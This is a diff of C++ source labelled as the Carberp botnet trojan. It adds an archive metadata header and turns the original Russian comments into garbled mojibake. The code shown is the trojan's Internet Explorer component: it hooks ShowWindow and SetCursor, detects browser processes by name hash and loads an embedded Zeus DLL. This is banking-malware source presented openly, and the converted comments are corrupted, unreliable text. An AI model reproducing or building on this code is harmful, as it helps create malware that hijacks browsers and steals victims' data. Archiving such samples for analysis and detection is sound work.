@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wininet.h>
 
@@ -28,7 +39,7 @@ namespace zeus
 #include "zeusdll.cpp"
 }
 
-//все функции которые мы будем хучить для IE
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ IE
 
 typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
 PShowWindow    Real_ShowWindow;
@@ -50,8 +61,8 @@ HCURSOR WINAPI Hook_SetCursor(HCURSOR hCursor)
 {
 	DbgMsg("Hook_SetCursor",0,"FUCK!!!!!!!!!!!");
 
-	// Заменяем курсор на стандартную стрелочку
-	// и вызываем оригинальную функцию
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HCURSOR cur = LoadCursor(NULL, IDC_ARROW);
 	return Real_SetCursor(cur);
 }
@@ -112,8 +123,8 @@ BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)
 
 bool WINAPI IsInternetExplorer()
 {
-	// Функция вернёт истину если она вызвана в процессе
-	// интернет експлорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );
 
@@ -123,7 +134,7 @@ bool WINAPI IsInternetExplorer()
 	}
 
 	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
-//	DbgMsgW(L"эксплорер ли это?",1,ModulePath);
+//	DbgMsgW(L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ?",1,ModulePath);
 	DWORD dwProcessHash = GetNameHash( ModulePath );
 
 	
@@ -133,7 +144,7 @@ bool WINAPI IsInternetExplorer()
 		 dwProcessHash == 0xC032B37E ||		//ieuser.exe //test for Vista
 		 dwProcessHash == 0x490A0972*/ )		// explorer.exe
 	{
-//	DbgMsgW(L"АГА Эксплорер",1,ModulePath);
+//	DbgMsgW(L"пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ",1,ModulePath);
 		MemFree( ModulePath );
 		return true;
 	}
@@ -177,9 +188,9 @@ void StartZeus()
 
 bool HookInternetExplorer()
 {
-	// функция вешает хуки на базовые функции которые использует
-	// Internet Explorer для загрузки документов
-	// Работает только в случае вызова из процесса интернет експлорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// Internet Explorer пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if ( !IsInternetExplorer() )
 	{
